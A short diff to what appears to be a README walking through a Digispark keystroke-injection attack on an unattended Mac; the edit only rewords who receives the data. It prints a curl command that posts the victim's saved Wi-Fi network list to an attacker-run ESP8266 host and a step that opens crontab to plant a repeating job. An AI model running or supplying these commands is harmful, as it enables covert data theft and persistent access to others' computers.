@@ -16,7 +16,7 @@ Attack goes: A victim leaves a MacOS computer unattended for 30 seconds. The att
   - We add the network "Sneakernet" to our trusted network list and connect to it.
   
 ##  DigiKeyboard.print("curl -m 10 --silent --output /dev/null -X POST -H \"Content-Type: text/plain\" --data \"$(networksetup -listpreferredwirelessnetworks en0)\" 192.168.4.1 &");
-  - After connecting, we send a CURL request listing every single network the MacOS computer has connected to in the past to the attacker computer. The & puts the process in the background in case it takes too long, and the -m sets a timer of 10 seconds to prevent it taking too long. Now we know which Wi-Fi networks the victim has joined, and which networks will force the computer to connect without asking.
+  - After connecting, we send a CURL request listing every single network the MacOS computer has connected to in the past to the esp8266 creating the "Sneakernet" network. The & puts the process in the background in case it takes too long, and the -m sets a timer of 10 seconds to prevent it taking too long. Now we know which Wi-Fi networks the victim has joined, and which networks will force the computer to connect without asking.
   
 ##  DigiKeyboard.print("export VISUAL=nano; crontab -e");
   - We create a job that will execute every 60 seconds
